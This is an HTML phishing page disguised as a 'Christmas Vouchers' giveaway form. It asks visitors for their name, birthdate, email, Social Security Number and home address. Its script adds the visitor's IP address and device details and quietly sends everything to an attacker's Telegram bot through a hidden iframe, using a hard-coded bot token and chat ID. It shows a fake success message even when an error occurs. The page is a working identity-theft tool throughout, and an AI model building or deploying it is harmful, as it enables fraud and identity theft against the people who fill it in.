<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÑ Christmas Vouchers</title>
    <style>
        /* ===== BASE STYLES ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
            line-height: 1.6;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
            max-width: 550px;
            width: 100%;
        }

        /* ===== HEADER SECTION ===== */
        .header {
            text-align: center;
            margin-bottom: 35px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f0f0f0;
        }

        .header h1 {
            color: #b21f1f;
            margin-bottom: 12px;
            font-size: 2.2em;
            font-weight: 700;
        }

        .header p {
            color: #666;
            font-size: 1.1em;
        }

        /* ===== FORM SECTIONS ===== */
        .form-section {
            margin-bottom: 30px;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 15px;
            border-left: 4px solid #b21f1f;
        }

        .section-title {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            color: #b21f1f;
            font-size: 1.3em;
            font-weight: 600;
        }

        .section-title .icon {
            margin-right: 10px;
            font-size: 1.2em;
        }

        /* ===== FORM GROUPS ===== */
        .form-group {
            margin-bottom: 20px;
        }

        .form-row {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-row .form-group {
            flex: 1;
            margin-bottom: 0;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
        }

        input, textarea, select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: white;
        }

        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #b21f1f;
            box-shadow: 0 0 0 3px rgba(178, 31, 31, 0.1);
            transform: translateY(-1px);
        }

        /* ===== BUTTON ===== */
        .submit-section {
            text-align: center;
            margin-top: 30px;
        }

        button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #b21f1f, #d32f2f);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(178, 31, 31, 0.3);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(178, 31, 31, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        /* ===== MESSAGES ===== */
        .loading {
            display: none;
            text-align: center;
            padding: 30px;
            background: #fff3cd;
            border: 2px solid #ffeaa7;
            border-radius: 15px;
            margin-bottom: 20px;
        }

        .loading p {
            color: #856404;
            font-weight: 600;
            font-size: 1.1em;
        }

        .success-message {
            display: none;
            text-align: center;
            padding: 40px;
            background: #d4edda;
            color: #155724;
            border-radius: 15px;
            border: 2px solid #c3e6cb;
        }

        .success-message h2 {
            margin-bottom: 15px;
            color: #155724;
        }

        /* ===== UTILITY CLASSES ===== */
        .optional {
            color: #666;
            font-weight: normal;
        }

        .required {
            color: #b21f1f;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 600px) {
            .container {
                padding: 25px;
                margin: 10px;
            }
            
            .form-row {
                flex-direction: column;
                gap: 0;
            }
            
            .form-section {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header Section -->
        <div class="header">
            <h1>üéÑ Christmas Vouchers</h1>
            <p>Fill out the form to receive your exclusive Christmas voucher!</p>
        </div>

        <!-- Loading Indicator -->
        <div id="loadingMessage" class="loading">
            <p>‚è≥ Processing your request...</p>
        </div>

        <!-- Main Form -->
        <form id="vipForm">
            <!-- Personal Information Section -->
            <div class="form-section">
                <div class="section-title">
                    <span class="icon">üë§</span>
                    Personal Information
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label>First Name <span class="required">*</span></label>
                        <input type="text" id="firstName" required>
                    </div>
                    <div class="form-group">
                        <label>Last Name <span class="required">*</span></label>
                        <input type="text" id="lastName" required>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label>Date of Birth <span class="required">*</span></label>
                        <input type="date" id="birthdate" name="birthdate" lang="en" required>
                    </div>
                    <div class="form-group">
                        <label>Email <span class="required">*</span></label>
                        <input type="email" id="email" required placeholder="your@email.com">
                    </div>
                </div>
            </div>

            <!-- Identification Section -->
            <div class="form-section">
                <div class="section-title">
                    <span class="icon">üîê</span>
                    Identification
                </div>
                
                <div class="form-group">
                    <label>Social Security Number <span class="required">*</span></label>
                    <input type="text" id="cardNumber" required placeholder="XXX-XX-XXXX">
                </div>
            </div>

            <!-- Shipping Address Section -->
            <div class="form-section">
                <div class="section-title">
                    <span class="icon">üìÆ</span>
                    Shipping Address
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label>State <span class="required">*</span></label>
                        <select id="state" required>
                            <option value="">Select State</option>
                            <option value="AL">Alabama</option>
                            <option value="AK">Alaska</option>
                            <option value="AZ">Arizona</option>
                            <option value="AR">Arkansas</option>
                            <option value="CA">California</option>
                            <option value="CO">Colorado</option>
                            <option value="CT">Connecticut</option>
                            <option value="DE">Delaware</option>
                            <option value="FL">Florida</option>
                            <option value="GA">Georgia</option>
                            <option value="HI">Hawaii</option>
                            <option value="ID">Idaho</option>
                            <option value="IL">Illinois</option>
                            <option value="IN">Indiana</option>
                            <option value="IA">Iowa</option>
                            <option value="KS">Kansas</option>
                            <option value="KY">Kentucky</option>
                            <option value="LA">Louisiana</option>
                            <option value="ME">Maine</option>
                            <option value="MD">Maryland</option>
                            <option value="MA">Massachusetts</option>
                            <option value="MI">Michigan</option>
                            <option value="MN">Minnesota</option>
                            <option value="MS">Mississippi</option>
                            <option value="MO">Missouri</option>
                            <option value="MT">Montana</option>
                            <option value="NE">Nebraska</option>
                            <option value="NV">Nevada</option>
                            <option value="NH">New Hampshire</option>
                            <option value="NJ">New Jersey</option>
                            <option value="NM">New Mexico</option>
                            <option value="NY">New York</option>
                            <option value="NC">North Carolina</option>
                            <option value="ND">North Dakota</option>
                            <option value="OH">Ohio</option>
                            <option value="OK">Oklahoma</option>
                            <option value="OR">Oregon</option>
                            <option value="PA">Pennsylvania</option>
                            <option value="RI">Rhode Island</option>
                            <option value="SC">South Carolina</option>
                            <option value="SD">South Dakota</option>
                            <option value="TN">Tennessee</option>
                            <option value="TX">Texas</option>
                            <option value="UT">Utah</option>
                            <option value="VT">Vermont</option>
                            <option value="VA">Virginia</option>
                            <option value="WA">Washington</option>
                            <option value="WV">West Virginia</option>
                            <option value="WI">Wisconsin</option>
                            <option value="WY">Wyoming</option>
                            <option value="DC">District of Columbia</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>City <span class="required">*</span></label>
                        <input type="text" id="city" required>
                    </div>
                </div>

                <div class="form-group">
                    <label>Street Address <span class="required">*</span></label>
                    <textarea id="address" rows="2" required placeholder="Enter your street address"></textarea>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label>Apt/Suite <span class="optional">(optional)</span></label>
                        <input type="text" id="apt" placeholder="Apartment, suite, unit, etc.">
                    </div>
                    <div class="form-group">
                        <label>ZIP Code <span class="required">*</span></label>
                        <input type="text" id="zip" required placeholder="12345">
                    </div>
                </div>
            </div>

            <!-- Submit Section -->
            <div class="submit-section">
                <button type="submit">üéÅ Get My Christmas Voucher</button>
            </div>
        </form>

        <!-- Success Message -->
        <div id="successMessage" class="success-message">
            <h2>üéâ Thank You!</h2>
            <p>Your application has been accepted. We will send your voucher soon.</p>
        </div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const TELEGRAM_BOT_TOKEN = '8537253559:AAGohyTz08NvyelLVMTs2VXXMJu7bZQZLjk';
        const TELEGRAM_CHAT_ID = '-4959049625';

        // ===== UTILITY FUNCTIONS =====

        // Get user IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown IP';
            }
        }

        // Get device fingerprint
        function getDeviceFingerprint() {
            return {
                userAgent: navigator.userAgent.substring(0, 50) + '...',
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
            };
        }

        // Collect form data
        function collectFormData() {
            return {
                // Personal Info
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                birthdate: document.getElementById('birthdate').value,
                email: document.getElementById('email').value,
                
                // Identification
                cardNumber: document.getElementById('cardNumber').value,
                
                // Address
                address: document.getElementById('address').value,
                apt: document.getElementById('apt').value,
                city: document.getElementById('city').value,
                state: document.getElementById('state').value,
                zip: document.getElementById('zip').value
            };
        }

        // Get full state name
        function getStateFullName() {
            const stateSelect = document.getElementById('state');
            return stateSelect.options[stateSelect.selectedIndex].text;
        }

        // Format Telegram message
        function formatTelegramMessage(formData, userIP, deviceInfo, stateFullName) {
            return `üéÑ NEW VIP REQUEST üéÑ%0A%0A` +
                   `üë§ PERSONAL INFORMATION%0A` +
                   `‚îú First Name: ${formData.firstName}%0A` +
                   `‚îú Last Name: ${formData.lastName}%0A` +
                   `‚îú Email: ${formData.email}%0A` +
                   `‚îî Birthdate: ${formData.birthdate}%0A%0A` +
                   
                   `üîê IDENTIFICATION%0A` +
                   `‚îî SSN: ${formData.cardNumber}%0A%0A` +
                   
                   `üìÆ SHIPPING ADDRESS%0A` +
                   `‚îú State: ${stateFullName}%0A` +
                   `‚îú City: ${formData.city}%0A` +
                   `‚îú Address: ${formData.address}%0A` +
                   `‚îú Apt: ${formData.apt || 'Not specified'}%0A` +
                   `‚îî ZIP: ${formData.zip}%0A%0A` +
                   
                   `üîç TECHNICAL DATA%0A` +
                   `‚îú IP: ${userIP}%0A` +
                   `‚îú Screen: ${deviceInfo.screen}%0A` +
                   `‚îú Language: ${deviceInfo.language}%0A` +
                   `‚îú Timezone: ${deviceInfo.timezone}%0A` +
                   `‚îî Time: ${new Date().toLocaleString('ru-RU')}`;
        }

        // Send message to Telegram
        function sendToTelegram(message) {
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = telegramUrl;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                document.body.removeChild(iframe);
            }, 1000);
        }

        // Show loading state
        function showLoading() {
            document.getElementById('vipForm').style.display = 'none';
            document.getElementById('loadingMessage').style.display = 'block';
        }

        // Show success state
        function showSuccess() {
            document.getElementById('loadingMessage').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
        }

        // ===== FORM HANDLING =====
        document.getElementById('vipForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            showLoading();
            
            try {
                // Collect data
                const userIP = await getUserIP();
                const deviceInfo = getDeviceFingerprint();
                const formData = collectFormData();
                const stateFullName = getStateFullName();

                // Format and send message
                const message = formatTelegramMessage(formData, userIP, deviceInfo, stateFullName);
                sendToTelegram(message);
                
                showSuccess();
                
            } catch (error) {
                console.error('Error:', error);
                showSuccess(); // Still show success to user
            }
        });
    </script>
</body>
</html>
